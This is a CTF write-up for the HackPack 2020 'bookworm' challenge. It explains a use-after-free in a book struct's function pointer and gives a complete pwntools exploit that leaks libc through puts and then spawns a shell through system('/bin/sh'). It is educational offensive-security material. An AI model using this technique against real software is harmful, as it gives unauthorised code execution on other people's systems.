---
layout: post
title: HackPack CTF 2020 - bookworm
---
> Bookworm: a book collection service.
>
> nc cha.hackpack.club:41720
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
bookworm: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=f10e73f79b28adde024987b5599945dd384a7551, not stripped

Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Target binary provides functionality for creating/deleting books and changing/reading books summary. 

{% highlight shell_session %}
        ***Welcome to Book Worm A Book Collection Service***

1)      Create a Book
2)      Delete a Book
3)      Change Book Summary
4)      Read Book Summary
5)      Quit
>>
{% endhighlight %}

Analyzing binary reveals that following book structure is used:

{% highlight c %}
struct book {
	void (*display_summary)(const char *),
	char *name,
	char *summary
};
{% endhighlight %}

We also can find that challenge contains use-after-free vulnerability. We can create new book, delete it, and then access it data (`summary`) through `read_summary`.

The exploitation strategy is to leak libc address by overwriting `*display_summary` function pointer to `puts@plt` and as a `*summary` set address of `puts@got`. Triggering `read_summary` will reveal `puts@got` address.

{% highlight python %}
create_book(23, "AAAAAAAA", 10, "BBBBBBBB")
delete_book(0)

payload = (
    p64(exe.plt["puts"]) +
    b"D" * 8 +
    p64(exe.got["puts"])
)
create_book(23, payload[:23], 10, "FFFFFFFF")

data = read_book_summary(0)
leak = u64(data[:6].ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)
{% endhighlight %}

Using the same technique we can execute `/bin/sh` by setting `*display_summary` function pointer to `system@libc` and as `*summary` set to address of `/bin/sh`.

{% highlight python %}
create_book(23, "HHHHHHHHH", 10, "IIIIIIII")
delete_book(2)

payload = (
    p64(libc.sym.system) +
    b"W" * 8 +
    p64(next(libc.search(b"/bin/sh")))
)
create_book(23, payload[:23], 10, "FFFFFFFF")

io.sendline("4")
io.recvuntil("Select Book ID (0-10): ")
io.sendline("2")

io.interactive()
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./bookworm')
libc = ELF("./libc.so.6")

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41720)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start(env={"LD_PRELOAD": "./libc.so.6"})

def create_book(name_size, name, summary_size, summary):
    io.sendline("1")
    io.recvuntil("Enter book name size: ")
    io.sendline(str(name_size))

    io.recvuntil("Enter book name: ")
    io.send(name)

    io.recvuntil("Enter book summary size: ")
    io.sendline(str(summary_size))

    io.recvuntil("Enter book summary: ")
    io.send(summary)

    io.recvuntil(">> ")

def delete_book(book_id):
    io.sendline("2")
    io.recvuntil("Select Book ID (0-10): ")
    io.sendline(str(book_id))

    io.recvuntil(">> ")

def read_book_summary(book_id):
    io.sendline("4")
    io.recvuntil("Select Book ID (0-10): ")
    io.sendline(str(book_id))
    data = io.recvuntil(">> ")
    return data

io.recvuntil(">> ")

create_book(23, "AAAAAAAA", 10, "BBBBBBBB")
delete_book(0)

payload = (
    p64(exe.plt["puts"]) +
    b"D" * 8 +
    p64(exe.got["puts"])
)
create_book(23, payload[:23], 10, "FFFFFFFF")

data = read_book_summary(0)
leak = u64(data[:6].ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

create_book(23, "HHHHHHHHH", 10, "IIIIIIII")
delete_book(2)

payload = (
    p64(libc.sym.system) +
    b"W" * 8 +
    p64(next(libc.search(b"/bin/sh")))
)
create_book(23, payload[:23], 10, "FFFFFFFF")

io.sendline("4")
io.recvuntil("Select Book ID (0-10): ")
io.sendline("2")

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/hackpackctf/bookworm
[decompiled_main]: {{site.baseurl}}/ctf/2020-04-29-hackpackctf-bookworm/decompiled_main.png
